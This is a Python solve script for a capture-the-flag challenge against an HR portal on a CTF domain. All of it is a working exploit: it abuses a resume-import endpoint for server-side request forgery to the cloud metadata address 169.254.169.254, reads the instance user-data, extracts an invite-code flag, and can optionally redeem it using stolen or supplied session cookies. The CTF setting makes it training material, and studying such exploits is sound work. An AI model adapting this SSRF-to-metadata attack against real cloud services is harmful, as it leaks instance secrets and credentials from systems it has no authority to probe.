#!/usr/bin/env python3
"""Task18: leak and optionally activate the PDF beta invite through SSRF."""

from __future__ import annotations

import argparse
import json
import re
import tempfile
from pathlib import Path
from typing import Any

import requests

DEFAULT_BASE = "https://hrportal-aoa51cvc.avitoctf.ru"
USER_DATA_URL = "http://169.254.169.254/latest/user-data"
INVITE_RE = re.compile(r"PDF_BETA_INVITE_CODE\s*=\s*['\"]?(avito\{[^}\r\n]+\})")


def all_text(value: Any):
    """Yield every string nested in an API response."""
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for item in value.values():
            yield from all_text(item)
    elif isinstance(value, list):
        for item in value:
            yield from all_text(item)


def extract_invite(response_text: str) -> str:
    """Extract PDF_BETA_INVITE_CODE from JSON fields or a raw reflected body."""
    candidates = [response_text]
    try:
        candidates.extend(all_text(json.loads(response_text)))
    except json.JSONDecodeError:
        pass
    for candidate in candidates:
        match = INVITE_RE.search(candidate)
        if match:
            return match.group(1)
    raise ValueError("PDF_BETA_INVITE_CODE was not present in the reflected response")


def cookie_header(path: Path | None, raw_cookie: str | None) -> str | None:
    """Accept either a raw Cookie header or a curl/Netscape cookies.txt file."""
    if raw_cookie:
        return raw_cookie
    if path is None:
        return None
    pairs = []
    for raw_line in path.read_text().splitlines():
        line = raw_line.removeprefix("#HttpOnly_")
        if not line or line.startswith("#"):
            continue
        fields = line.split("\t")
        if len(fields) >= 7:
            pairs.append(f"{fields[5]}={fields[6]}")
    if not pairs:
        raise ValueError(f"no cookies found in {path}")
    return "; ".join(pairs)


def solve(
    base: str,
    cookie: str | None,
    *,
    activate: bool,
    output: Path | None,
) -> str:
    """Run SSRF -> reflected cloud-init -> invite extraction."""
    headers = {"Cookie": cookie} if cookie else {}
    with requests.Session() as session:
        response = session.post(
            f"{base.rstrip('/')}/api/seeker/resume/import",
            json={"url": USER_DATA_URL},
            headers=headers,
            timeout=45,
        )
        print(f"[ssrf] HTTP {response.status_code}")
        if output:
            output.write_text(response.text)
            print(f"[ssrf] raw response: {output}")
        try:
            invite = extract_invite(response.text)
        except ValueError:
            response.raise_for_status()
            raise
        print(f"FLAG / invite: {invite}")
        if activate:
            activated = session.post(
                f"{base.rstrip('/')}/api/seeker/pdf/activate",
                json={"code": invite},
                headers=headers,
                timeout=30,
            )
            print(f"[activate] HTTP {activated.status_code}: {activated.text[:500]}")
            activated.raise_for_status()
        return invite


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--cookie", help="raw Cookie header from an authenticated seeker session")
    parser.add_argument("--cookie-file", type=Path, help="curl/Netscape cookies.txt")
    parser.add_argument("--activate", action="store_true", help="also activate the leaked invite")
    parser.add_argument("--output", type=Path, help="optional path for the raw SSRF response")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        fixture = {"exception": "", "content": "X\nPDF_BETA_INVITE_CODE=avito{fixture}\n"}
        assert extract_invite(json.dumps(fixture)) == "avito{fixture}"
        with tempfile.TemporaryDirectory(prefix="task18-selftest-") as tmp:
            jar = Path(tmp) / "cookies.txt"
            jar.write_text(
                "# Netscape HTTP Cookie File\n"
                "#HttpOnly_.example.test\tTRUE\t/\tFALSE\t0\tsession\tfixture\n"
            )
            assert cookie_header(jar, None) == "session=fixture"
        print("self-test: OK")
        return
    solve(
        args.base,
        cookie_header(args.cookie_file, args.cookie),
        activate=args.activate,
        output=args.output,
    )


if __name__ == "__main__":
    main()
